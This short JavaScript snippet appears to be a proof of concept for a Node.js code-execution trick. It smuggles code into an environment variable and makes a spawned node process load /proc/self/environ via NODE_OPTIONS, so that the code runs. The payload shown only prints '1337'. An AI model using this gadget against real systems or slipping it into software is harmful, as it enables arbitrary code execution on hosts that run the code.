function spawn() {
    require("child_process").spawn("node", [], {
        env: {
            AAA: 'console.log("1337")//',
            NODE_OPTIONS: "--require /proc/self/environ",
            ...process.env, // <-- the order is matter
        },
        stdio: "inherit",
    });
}
spawn();